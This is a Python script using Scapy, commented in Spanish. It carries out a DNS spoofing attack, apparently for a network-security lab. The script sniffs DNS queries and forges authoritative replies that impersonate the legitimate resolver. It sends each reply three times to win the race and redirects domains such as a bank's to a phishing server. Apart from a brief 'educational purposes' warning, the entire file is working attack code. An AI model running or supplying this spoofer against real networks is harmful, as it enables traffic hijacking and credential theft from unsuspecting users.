#!/usr/bin/env python3
"""
Script de Ataque DNS Spoofing
Intercepta consultas DNS y envia respuestas falsas
"""

from scapy.all import *
import sys
import os
import time

# Configuracion del ataque
INTERFACE = "attacker-eth0"
DNS_SERVER_IP = "10.0.0.53"  # DNS legitimo
ATTACKER_IP = "10.0.0.66"
FAKE_WEB_SERVER = "10.0.0.99"  # Servidor falso/phishing

# Dominios a suplantar
SPOOFED_DOMAINS = {
    "www.banco.com": FAKE_WEB_SERVER,
    "banco.com": FAKE_WEB_SERVER,
    "www.example.com": FAKE_WEB_SERVER,
    "example.com": FAKE_WEB_SERVER,
    "legitimo.com": FAKE_WEB_SERVER,
}

# Estadisticas
stats = {
    'packets_sent': 0,
    'domains_spoofed': 0,
    'queries_intercepted': 0
}

def print_header():
    """
    Imprime header del ataque
    """
    print("\n" + "="*70)
    print("  ATAQUE DNS SPOOFING")
    print("="*70)
    print(f"\nInterfaz: {INTERFACE}")
    print(f"Servidor DNS legitimo: {DNS_SERVER_IP}")
    print(f"Servidor web falso: {FAKE_WEB_SERVER}")
    print(f"\nDominios a suplantar:")
    for domain, fake_ip in SPOOFED_DOMAINS.items():
        print(f"  {domain:<25} -> {fake_ip}")
    print("\n[*] Iniciando ataque DNS spoofing...")
    print("[*] Presiona Ctrl+C para detener")
    print("-"*70)

def dns_spoof(packet):
    """
    Intercepta consultas DNS y envia respuestas falsas
    MEJORA: Responde INMEDIATAMENTE, antes que el DNS real
    """
    global stats
    
    # Verificar que sea un paquete DNS
    if not packet.haslayer(DNS):
        return
    
    # Solo procesar consultas DNS (qr=0)
    if packet[DNS].qr != 0:
        return
    
    # Solo procesar tipo A (IPv4)
    if packet[DNS].qd.qtype != 1:
        return
    
    stats['queries_intercepted'] += 1
    
    # Obtener el dominio consultado
    queried_domain = packet[DNS].qd.qname.decode('utf-8').rstrip('.')
    
    # Verificar si es un dominio que queremos suplantar
    if queried_domain in SPOOFED_DOMAINS:
        fake_ip = SPOOFED_DOMAINS[queried_domain]
        
        print(f"\n[INTERCEPTED] Consulta DNS para: {queried_domain}")
        print(f"[SPOOFING]    Enviando respuesta falsa: {fake_ip}")
        
        # IMPORTANTE: Construir respuesta EXACTAMENTE como el DNS real la construiría
        # pero con nuestra IP falsa
        
        # Obtener información del paquete original
        src_ip = packet[IP].src
        src_port = packet[UDP].sport
        dns_id = packet[DNS].id
        question = packet[DNS].qd
        
        # Construir respuesta DNS falsa
        # La clave es responder MÁS RÁPIDO que el servidor DNS real
        spoofed_pkt = IP(dst=src_ip, src=DNS_SERVER_IP) / \
                     UDP(dport=src_port, sport=53) / \
                     DNS(
                         id=dns_id,  # Mismo ID de transaccion (CRITICO)
                         qr=1,  # Es una respuesta
                         aa=1,  # Authoritative answer
                         rd=1,  # Recursion desired
                         ra=1,  # Recursion available
                         qd=question,  # Misma pregunta
                         an=DNSRR(
                             rrname=question.qname,
                             type='A',
                             ttl=300,
                             rdata=fake_ip  # IP FALSA
                         )
                     )
        
        # Enviar respuesta falsa VARIAS VECES para asegurar que llegue primero
        # El que llegue primero al cliente gana
        for i in range(3):  # Enviar 3 veces
            send(spoofed_pkt, verbose=0, iface=INTERFACE)
            stats['packets_sent'] += 1
        
        stats['domains_spoofed'] += 1
        
        print(f"[SUCCESS]     Respuesta DNS falsa enviada x3 ({stats['packets_sent']} paquetes totales)")
        print(f"[VICTIM]      Cliente deberia recibir IP: {fake_ip} (servidor FALSO)")
        print(f"[RACE]        Compitiendo con servidor DNS real en {DNS_SERVER_IP}")
        print("-"*70)
    else:
        # No es un dominio objetivo, solo registrar ocasionalmente
        if stats['queries_intercepted'] % 10 == 0:  # Mostrar cada 10
            print(f"[INFO] Consultas interceptadas: {stats['queries_intercepted']}, "
                  f"Dominios suplantados: {stats['domains_spoofed']}")

def start_sniffing():
    """
    Inicia la captura de paquetes DNS
    """
    print(f"\n[*] Escuchando consultas DNS en {INTERFACE}...")
    print(f"[*] Filtrando: udp port 53")
    
    try:
        # Capturar paquetes DNS (puerto 53 UDP)
        sniff(
            iface=INTERFACE,
            filter="udp port 53",
            prn=dns_spoof,
            store=0
        )
    except KeyboardInterrupt:
        print("\n\n[!] Ataque detenido por el usuario")
        print_statistics()
        sys.exit(0)

def print_statistics():
    """
    Imprime estadisticas del ataque
    """
    print("\n" + "="*70)
    print("  ESTADISTICAS DEL ATAQUE")
    print("="*70)
    print(f"\nConsultas DNS interceptadas: {stats['queries_intercepted']}")
    print(f"Dominios suplantados:        {stats['domains_spoofed']}")
    print(f"Paquetes DNS falsos enviados: {stats['packets_sent']}")
    print("\n[RESULTADO]")
    if stats['domains_spoofed'] > 0:
        print(f"  [SUCCESS] Ataque exitoso - {stats['domains_spoofed']} consultas envenenadas")
        print(f"  [IMPACT]  Los clientes fueron redirigidos a {FAKE_WEB_SERVER}")
        print(f"  [PHISHING] Posible robo de credenciales si accedieron al sitio falso")
    else:
        print(f"  [INFO] No se interceptaron consultas para dominios objetivo")
    print("="*70 + "\n")

def check_interface():
    """
    Verifica que la interfaz exista
    """
    import subprocess
    result = subprocess.run(['ip', 'link', 'show', INTERFACE],
                          capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[ERROR] Interfaz {INTERFACE} no encontrada")
        print(f"[SOLUCION] Verifica el nombre de la interfaz con: ifconfig")
        return False
    return True

if __name__ == "__main__":
    print("\n[WARNING] Este script es solo para propositos educativos")
    print("[WARNING] DNS spoofing sin autorizacion es ILEGAL\n")
    
    if os.geteuid() != 0:
        print("[ERROR] Este script debe ejecutarse como root")
        print("[SOLUCION] Ejecuta: sudo python3 dns_spoof_attack.py")
        sys.exit(1)
    
    if not check_interface():
        sys.exit(1)
    
    print_header()
    
    try:
        start_sniffing()
    except Exception as e:
        print(f"\n[ERROR] {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
